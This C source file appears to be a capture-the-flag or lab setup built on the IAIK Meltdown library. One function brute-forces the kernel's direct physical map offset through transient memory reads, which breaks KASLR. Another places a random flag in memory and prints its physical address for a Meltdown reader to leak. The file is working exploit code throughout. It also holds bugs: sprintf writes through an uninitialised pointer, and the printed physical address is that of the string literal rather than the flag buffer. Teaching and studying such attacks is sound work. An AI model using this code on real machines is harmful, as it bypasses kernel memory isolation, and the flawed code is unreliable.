// include works of https://github.com/IAIK/meltdown
#include "libkdump/libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <string.h>
#include <time.h>
#define LEN 11

int kaslr() {
  size_t scratch[4096];
  libkdump_config_t config;
  size_t offset = DEFAULT_PHYSICAL_OFFSET;
#ifdef __x86_64__
  size_t step = 0x800000000ll;
#else
  size_t step = 0x1000000;
#endif
  size_t delta = -2 * step;
  int progress = 0;

  libkdump_enable_debug(0);

  config = libkdump_get_autoconfig();
  config.retries = 10;
  config.measurements = 1;

  libkdump_init(config);

  size_t var = (size_t)(scratch + 2048);
  *(char *)var = 'X';

  size_t start = libkdump_virt_to_phys(var);
  if (!start) {
    printf("Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }

  while (1) {
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';

    int res = libkdump_read(start + offset + delta);
    if (res == 'X') {
      printf("\rDirect physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
      fflush(stdout);
      break;
    } else {
      delta += step;
      if (delta >= -1ull - offset) {
        delta = 0;
        step >>= 4;
      }
      printf("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
    }
  }
    libkdump_cleanup();
    return 0;
}

int set_secret()
{
    char *secret = "You got the flag!! flag is: flag{";
    int i;
    int len;
    char *message;
    libkdump_config_t config;
    config = libkdump_get_autoconfig();
    libkdump_init(config);

    srand(time(NULL));
    char flag[LEN];
    for (i=0;i<LEN-2;i++)
    {
        flag[i] = rand() % 94 + 32;
    }
    flag[LEN-2] = '}';
    flag[LEN-1] = '\n';
    printf("Secret: %s%s", secret, flag);
    sprintf(message, "%s%s", secret, flag);
    len = strlen(message);

    size_t paddr = libkdump_virt_to_phys((size_t)secret);
    if (!paddr) 
    {
        printf("Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
        libkdump_cleanup();
        exit(1);
    }

    printf("Physical address of secret: %zx\n", paddr);
    printf("Exit with Ctrl+C if you are done reading the secret\n");
    while (1)
    {
        volatile size_t dummy = 0, i;
        for (i = 0; i < len; i++)
        {
            dummy += message[i];
        }
        sched_yield();
    }

    libkdump_cleanup();
    /* code */
    return 0;
}

int main()
{
  kaslr();
  set_secret();
}
